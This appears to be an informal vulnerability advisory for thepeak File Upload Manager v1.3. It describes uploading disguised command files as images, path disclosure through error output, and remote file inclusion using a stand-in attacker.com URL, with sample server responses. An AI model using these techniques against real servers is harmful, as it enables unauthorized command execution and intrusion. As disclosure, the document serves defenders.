hi,
there is a posiblity path disclosure and run commands on a server usint thepeak File Upload v1.3
searching for /fileupload/index.php an attacker can upload a malicious jpg of gif and can execute commands or make a file inclusion,
but it cant be directly to upload a php file with .jpg extension, because detect the content type as text/plain, look this:


name : cmd.jpg 
type : text/plain  <--- when you upload the file the content type is seem like this
tmp_name : /tmp/phpF0AItw <-- this is a copy of the file in the server with a ramdom temp
error : 0 
size : 26564 

http://server.com/fileupload/store/cmd.jpg <--- this is where is stored the original file

there is a 2 ways to get in
cracking the content-type when uploading the file or constructing an malicious jpg image with some commands:
1: chmod the dir for file inclusion
2: run certain commands on server, etc


Path Disclosure
when you try to put in input of upload file something like
http://www.attacker.com/command.jpg its seem the path of the web files like this:

File Upload Manager v1.3  ï¿½ thepeak  


name : http://www.attacker.com/cmd.gif 
type : application/octet-stream 
tmp_name : /tmp/phptd8aE0 
error : 0 
size : 0 


Warning: copy(store/http://www.attacker.com/cmd.gif): failed to open stream: No such file or directory in /home/user/public_html//fileupload/index.php on line 471

 ERROR: cannot upload, please chmod the dir to 777

some servers accept the file inclusion and you get this

name : http://www.attacker.com/cmd.gif 
type : application/octet-stream 
tmp_name : /tmp/phptd8aE0 
error : 0 
size : 1035

file uploaded!
